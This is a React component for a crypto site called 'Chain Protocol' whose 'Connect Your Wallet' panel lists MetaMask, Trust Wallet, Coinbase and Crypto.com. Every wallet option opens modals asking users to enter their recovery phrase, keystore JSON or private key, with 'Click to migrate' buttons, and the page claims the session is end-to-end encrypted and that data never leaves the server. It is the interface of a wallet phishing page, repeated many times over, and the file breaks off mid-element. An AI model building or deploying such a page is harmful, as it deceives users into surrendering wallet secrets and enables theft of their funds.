import "./Header.css";
import metamask from "../../assets/metamask.png";
import trustwallet from "../../assets/trust-wallet-logo.webp";
import coinbase from "../../assets/coinbase-coin-logo.png";
import polkadot from "../../assets/polkadot-coin-logo-icon.jpg";
import maiar from "../../assets/maiar-logo.jpg";
import crypto from "../../assets/crypto.jpeg";
import { Fragment } from "react";

const Header = () => {
  return (
    <Fragment>
      <div>
        <div className="container">
          <div className="row">
            <div className="">
              <h3 className="text-white mt-5 fw-bold">
                Decentralized to | with Chain Protocol
              </h3>
              <p className="text-white mt-5">
                Chain provides industry-leading web3 and Blockchain a safe
                protocol and process encrypted by a superb encryption server.
                Your infromation never leaves our server or be visible to
                anyone. Its an end-to-end emcryption with no human interaction.
              </p>
              <button
                className="btn btn-primary"
                type="button"
                data-bs-toggle="offcanvas"
                data-bs-target="#offcanvasScrolling"
                aria-controls="offcanvasScrolling"
              >
                Connect Your Wallet
              </button>
              <div
                className="offcanvas offcanvas-end"
                data-bs-scroll="true"
                data-bs-backdrop="false"
                tabIndex={-1}
                id="offcanvasScrolling"
                aria-labelledby="offcanvasScrollingLabel"
              >
                <div className="offcanvas-header">
                  <h5 className="offcanvas-title" id="offcanvasScrollingLabel">
                    Connect Your Wallet
                  </h5>
                  <button
                    type="button"
                    className="btn-close"
                    data-bs-dismiss="offcanvas"
                    aria-label="Close"
                  ></button>
                </div>
                <div className="offcanvas-body">
                  <div className="row align-items-center">
                    <div className="col-6">
                      <img
                        className="w-25"
                        src={metamask}
                        alt="metamask logo"
                      />
                    </div>
                    <div className="col-6">
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        <span className="meta-link text-black">Metamask</span>
                      </button>

                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>

                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        Click to migrate
                      </button>
                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                    </div>
                    <hr className="mt-3" />
                  </div>
                  <div className="row">
                    <div className="col-6">
                      <img
                        className="w-25"
                        src={trustwallet}
                        alt="metamask logo"
                      />
                    </div>
                    <div className="col-6">
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        <span className="meta-link text-black">
                          Trust Wallet
                        </span>
                      </button>

                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>

                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        Click to migrate
                      </button>
                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                    </div>
                    <hr className="mt-3" />
                  </div>
                  <div className="row">
                    <div className="col-6">
                      <img
                        className="w-25"
                        src={coinbase}
                        alt="metamask logo"
                      />
                    </div>
                    <div className="col-6">
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        <span className="meta-link text-black">CoinBase</span>
                      </button>

                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>

                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        Click to migrate
                      </button>
                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>
                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                    </div>
                    <hr className="mt-3" />
                  </div>
                  <div className="row">
                    <div className="col-6">
                      <img className="w-25" src={crypto} alt="metamask logo" />
                    </div>
                    <div className="col-6">
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        <span className="meta-link text-black">Crypto.com</span>
                      </button>

                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-home"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-home"
                                    aria-selected="true"
                                  >
                                    Phrase
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-profile-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-profile"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-profile"
                                    aria-selected="false"
                                  >
                                    Keystore JSON
                                  </button>
                                  <button
                                    className="nav-link"
                                    id="nav-contact-tab"
                                    data-bs-toggle="tab"
                                    data-bs-target="#nav-contact"
                                    type="button"
                                    role="tab"
                                    aria-controls="nav-contact"
                                    aria-selected="false"
                                  >
                                    Private Key
                                  </button>
                                </div>
                              </nav>
                              <div className="tab-content" id="nav-tabContent">
                                <div
                                  className="tab-pane fade show active"
                                  id="nav-home"
                                  role="tabpanel"
                                  aria-labelledby="nav-home-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR WALLET KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 text-white w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-profile"
                                  role="tabpanel"
                                  aria-labelledby="nav-profile-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR KEYSTORE JSON"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                                <div
                                  className="tab-pane fade"
                                  id="nav-contact"
                                  role="tabpanel"
                                  aria-labelledby="nav-contact-tab"
                                  tabIndex={0}
                                >
                                  <textarea
                                    className="mt-3 p-1"
                                    name=""
                                    id=""
                                    cols={30}
                                    rows={5}
                                    placeholder="Enter YOUR PRIVATE KEY"
                                  ></textarea>
                                  <span className="text-secondary pass-note fw-bold">
                                    Typically 12(sometimes24) words separated by
                                    single spaces
                                  </span>
                                  <button
                                    className="fw-bold mt-3 w-100"
                                    type="submit"
                                  >
                                    Proceed
                                  </button>
                                </div>
                              </div>
                            </div>
                            <div className="modal-footer">
                              <p className="text-danger fw-bold">.</p>
                            </div>
                          </div>
                        </div>
                      </div>

                      <script>
                        const myModal = new bootstrap.Modal(
                        document.getElementById("modalId"), options, );
                      </script>
                      <button
                        type="button"
                        className="btn-phrase text-white btn-lg"
                        data-bs-toggle="modal"
                        data-bs-target="#modalId"
                      >
                        Click to migrate
                      </button>
                      <div
                        className="modal fade"
                        id="modalId"
                        tabIndex={1}
                        data-bs-backdrop="false"
                        data-bs-keyboard="false"
                        role="dialog"
                        aria-labelledby="modalTitleId"
                        aria-hidden="true"
                      >
                        <div
                          className="modal-dialog modal-dialog-scrollable modal-dialog-centered modal-sm"
                          role="document"
                        >
                          <div className="modal-content">
                            <div className="modal-header">
                              <h5 className="modal-title" id="modalTitleId">
                                Connect Wallet
                              </h5>
                              <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                arial-label="Close"
                              ></button>
                            </div>
                            <p className="encrypted text-center fw-bold text-secondary mt-2">
                              This session is end-to-end encrypted
                            </p>
                            <div className="modal-body">
                              <nav>
                                <div
                                  className="nav nav-tabs"
                                  id="nav-tab"
                                  role="tablist"
                                >
                                  <button
                                    className="nav-link"
                                    id="nav-home-tab"
                                    data-bs-toggle="tab"
